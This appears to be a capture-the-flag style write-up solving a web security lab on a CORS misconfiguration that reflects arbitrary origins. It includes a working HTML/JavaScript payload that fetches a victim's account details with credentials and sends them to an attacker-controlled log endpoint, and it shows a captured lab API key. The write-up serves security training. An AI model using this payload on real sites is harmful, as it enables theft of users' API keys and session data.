![image](https://github.com/udayk01/Web-Security/assets/52235763/e233584d-a065-4d02-be2e-0a5190ae8890)

## Solution:

> Check intercept is off, then use the browser to log in and access your account page.

![image](https://github.com/udayk01/Web-Security/assets/52235763/53ef980f-f130-4137-a6c5-c614ada3449b)

> Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

![image](https://github.com/udayk01/Web-Security/assets/52235763/479cfcd9-8368-4483-a558-60615f75e13a)

> Send the request to Burp Repeater, and resubmit it with the added header:

>> ```Origin: https://example.com```

![image](https://github.com/udayk01/Web-Security/assets/52235763/6b12feb5-920d-48f5-a7ea-ec82220e62e2)

>> Observe that the origin is reflected in the Access-Control-Allow-Origin header.

> In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL:
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/cc92596b-d56d-4373-8758-eef7e7974a4d)

> Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

![image](https://github.com/udayk01/Web-Security/assets/52235763/f7a44496-4c8d-43e2-bc4d-b64eaaef30ec)

> Go back to the exploit server and click Deliver exploit to victim.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b0f87018-14ed-4397-9bad-5ec5cfd8906e)

>> Click Access log, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c851bdb0-3aac-4844-bb97-f76f1f214e2f)

>> API key : ```SryMmFMPUwlMrctx4b7MWFKlU3bnWqyN```

![Screenshot 2024-04-20 114506](https://github.com/udayk01/Web-Security/assets/52235763/3c358d40-0162-4960-a549-568070b2a29f)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/87031bb4-f356-4b9f-8515-e9fc1ff5ad5b)

